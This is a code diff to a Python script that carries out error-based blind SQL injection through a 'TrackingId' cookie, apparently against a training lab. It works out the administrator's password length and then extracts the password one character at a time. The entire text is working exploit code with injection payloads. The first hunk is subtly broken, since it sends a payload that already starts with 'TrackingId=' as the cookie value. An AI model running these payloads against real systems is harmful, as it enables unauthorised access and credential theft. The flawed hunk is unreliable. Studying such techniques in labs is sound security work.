@@ -6,7 +6,7 @@ def enumerate_password_length(url):
     password_length = 0
     for i in range(1, 50):
         TrackingID = f"TrackingId=abc'||(SELECT CASE WHEN LENGTH(password)={i} THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'"
-        response = requests.get(url,headers={"Cookie": TrackingID})
+        response = requests.get(url, cookies={"TrackingId": TrackingID})
         if response.status_code == 200:
             password_length = i
             break
@@ -20,7 +20,7 @@ def enumerate_password(url, length):
     for i in range(1, length + 1):
         for j in alphanumeric_characters:
             TrackingID = f"abc'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{j}' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'"
-            response = requests.get(url, headers={"Cookie": f"TrackingId={TrackingID}"})
+            response = requests.get(url, cookies={"TrackingId": TrackingID})
             if response.status_code == 200:
                 password = password + j
                 print(j, end='', flush=True)
